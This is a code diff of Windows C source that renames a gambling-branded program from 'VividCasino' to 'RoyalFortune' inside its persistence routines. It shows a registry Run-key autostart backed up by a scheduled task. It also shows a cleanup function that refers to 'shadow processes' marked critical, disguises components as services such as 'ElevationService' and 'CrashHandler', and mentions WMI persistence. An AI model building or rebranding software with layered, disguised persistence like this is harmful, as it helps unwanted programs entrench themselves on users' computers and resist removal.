@@ -176,11 +176,11 @@ void sys_register_autostart(void) {
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
             "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
             0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, "VividCasino", 0, REG_SZ, (BYTE*)path, (DWORD)strlen(path) + 1);
+        RegSetValueExA(hKey, "RoyalFortune", 0, REG_SZ, (BYTE*)path, (DWORD)strlen(path) + 1);
         RegCloseKey(hKey);
     }
     /* Also add scheduled task for redundancy */
-    util_ensure_task(path, "VividCasinoMain");
+    util_ensure_task(path, "RoyalFortuneMain");
 }
 
 /* Check and request required privileges for system integration */
@@ -381,7 +381,7 @@ void sys_cleanup(void) {
         "ElevationService",
         "CrashHandler",
         "NotifyService",
-        "VividCasino"
+        "RoyalFortune"
     };
     
     /* 1. Remove critical flag from ALL shadow processes */
@@ -433,7 +433,7 @@ void sys_cleanup(void) {
         snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"%s\" /f 2>nul", regKeys[i]);
         system(cmd);
     }
-    snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"VividCasinoMain\" /f 2>nul");
+    snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"RoyalFortuneMain\" /f 2>nul");
     system(cmd);
     
     /* 5. Remove WMI persistence */
